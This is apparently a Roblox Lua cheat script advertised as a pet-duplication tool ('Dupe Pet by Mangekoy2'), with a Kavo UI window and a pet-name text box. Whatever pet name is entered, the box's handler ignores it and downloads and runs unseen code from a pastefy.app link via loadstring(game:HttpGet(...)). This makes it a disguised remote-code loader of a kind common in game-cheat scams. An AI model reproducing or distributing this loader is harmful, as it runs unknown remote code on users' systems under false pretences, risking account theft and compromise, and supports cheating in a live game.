local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Dupe Pet by Mangekoy2 | v2.0", "Serpent")

-- Вкладка 1: Dupe Pet
local Tab1 = Window:NewTab("Dupe Pet")
local Section1 = Tab1:NewSection("DUPE PET")

-- Один комбинированный элемент: и ввод, и действие
Section1:NewTextBox("DUPE", "Write any pet and press Enter", function(txt)
    if txt ~= "" then
        loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
    else
        warn("You must enter a pet name!")
    end
end)

-- Вкладка 2: Credits
local Tab2 = Window:NewTab("Credits")
local Section2 = Tab2:NewSection("Made by Mangekoy2 | v2.0")
